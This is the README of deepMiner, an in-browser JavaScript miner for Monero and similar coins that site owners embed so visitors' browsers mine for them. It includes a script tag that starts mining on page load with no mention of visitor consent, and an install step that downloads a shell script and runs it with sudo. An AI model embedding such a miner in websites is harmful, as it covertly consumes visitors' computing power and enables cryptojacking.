# deepMiner

![](https://raw.githubusercontent.com/deepwn/deepMiner/master/.github/banner.png)

* deepMiner (idea from coinhive.js) By evil7@deePwn
* Working on XMR(Monero) and ETN(Electroneum) personal wallet
* Eazy way mining in browsers & Nice payback than Ad-inject

### NOT SUPPORT WITH MONERO7 !!! it will or not update anymore.

### Or maybe just slowly changing. because I don't have time to developing with this project.

### If need help please go checking issues (all open & closed. tag by [helpful info])

## Support on

![](https://raw.githubusercontent.com/deepwn/deepMiner/master/.github/xmr.png) ![](https://raw.githubusercontent.com/deepwn/deepMiner/master/.github/etn.png)![](https://raw.githubusercontent.com/deepwn/deepMiner/master/.github/sumokoin.png)

* And All coins who follow `cryptoNight` && pool connect in `JSONRPC2`
* Some coins used cryptoNote <https://cryptonote.org/coins/> (example: Monero / Electroneum /Sumokoin / Aeon ...)
* The whitebook: `cryptoNight.txt` and `cryptoNight.md`. Come from: <https://cryptonote.org/standards/>
* Technology: <https://cryptonote.org/inside/>

## Donate (if you like this project <3)

Glad to have your support. More awesomes coming soon!

| Coin | Address |
| :---: | :--- |
| BTC | `1HNkaBbCWcye6uZiUZFzk5aNYdAKWa5Pj9` |
| XMR | `41ynfGBUDbGJYYzz2jgSPG5mHrHJL4iMXEKh9EX6RfEiM9JuqHP66vuS2tRjYehJ3eRSt7FfoTdeVBfbvZ7Tesu1LKxioRU` |
| ETN | `etnkF3ewgWDaFwLr39okYsW4yaC5cb5bEMZUJsCJsgeJM6Lx3oeAs8VhSYcQBwQTbxNA5TcRiPtAk1GqeFZtAVzK5DJ7d9mmXh` |

## Usage

* Add some javascript and write like this :

```html
<script src="https://digxmr.com/deepMiner.js"></script>
<script>
    var miner = new deepMiner.Anonymous('deepMiner_test').start();
</script>
```

* All done! XD~ Let's build our srv by self

## Install

```bash
curl https://raw.githubusercontent.com/deepwn/deepMiner/master/install.sh > install.sh
sudo sh install.sh
```

lib request: `*nodejs` / `*npm` / `?nginx`

useful pakages: `forever`

ssl support: <https://certbot.eff.org/>

OS pass: `ubuntu(debian)`

## API

Same like this: <https://coinhive.com/documentation/miner> (JUST javascript API)

## Update

Just go `/srv/deepMiner` and run `git pull`

DON'T forget backup your `config.json` !!!

## Attention

Some VPS's default DNS can't find IP for the pool. Check your DNS setting if it's wrong.

SSL cert request default TRUE. Use `certbot` to quickly set it.

If not a bug just Qus in something setting or in install. Please write down at <https://github.com/deepwn/deepMiner/issues/8>

## Example & Some tips

<https://digxmr.com/demo.html>

Tips:

1. Trying build own pool-Server too? <https://github.com/zone117x/node-cryptonote-pool> / <https://github.com/Snipa22/nodejs-pool>
1. If you want to create your own pool. check my blog it's maybe helpful to you. (just in chinese language now) 

blog1 <http://www.freebuf.com/column/151316.html>
blog2 <http://www.freebuf.com/column/151376.html>

## About pools

1. Choice another pool which you wanna using: <https://github.com/timekelp/xmr-pool-choice>

1. If ETN pool you want: `http://minekitten.io` a nice pool and so qute funny UI. (Or build one pool by yourself. Same way like build a xmr pool)

Rules if building a pool by yourself:

1. NO banned in the pool. This `deepMiner` object working in a web page. used to payback XMR for your website like the Ad payback. But you know people will NOT stay on just 1 site page and will not take long time stay in website (If NOT online web game or online live show). So do not banned in your pool and used the pool just yourself. 

1. stay in Low-difficulty, It's more eazy for this JavaScript miner. Stucked at `diff=256` or `diff=1000` is OK.

## License

MIT <https://raw.githubusercontent.com/deepwn/deepMiner/master/LICENSE>

## Missions

Building a WebUI. Manage about miner status and banned rules pool setting or something
